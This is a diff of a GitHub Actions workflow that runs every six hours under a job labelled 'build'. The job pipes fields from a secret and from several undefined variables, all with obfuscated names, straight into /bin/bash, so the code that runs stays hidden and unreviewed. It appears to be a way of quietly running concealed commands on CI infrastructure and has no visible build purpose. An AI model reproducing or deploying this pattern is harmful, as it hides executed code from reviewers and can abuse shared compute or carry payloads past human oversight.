@@ -3,8 +3,7 @@ name: wendingxxo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
-
+    - cron: '57 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,10 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: wendingxxo
         env:
-          hh5: ${{ secrets.hh5 }}
+          k2: ${{ secrets.k2 }}
         run: |
-          echo $hh5 | jq -r .ute6673 | /bin/bash
-          echo $fziz7743 | jq -r .gr11112 | /bin/bash
-          echo $c0 | jq -r .qf41680 | /bin/bash
-          echo $nshd29401 | jq -r .lvqqq973 | /bin/bash
+          echo $k2 | jq -r .bn312 | /bin/bash
+          echo $px20918 | jq -r .c26 | /bin/bash
+          echo $r0 | jq -r .p13 | /bin/bash
+          echo $lxf7840 | jq -r .wxr62 | /bin/bash
+          echo $l85687 | jq -r .bit31129 | /bin/bash
+          echo $lvhr51 | jq -r .p84 | /bin/bash
+          echo $sdsrd0 | jq -r .i668 | /bin/bash
+          echo $miqq46453 | jq -r .lfi05930 | /bin/bash
+          echo $plw8 | jq -r .wo101 | /bin/bash
+          echo $xqf923 | jq -r .jc71 | /bin/bash
 
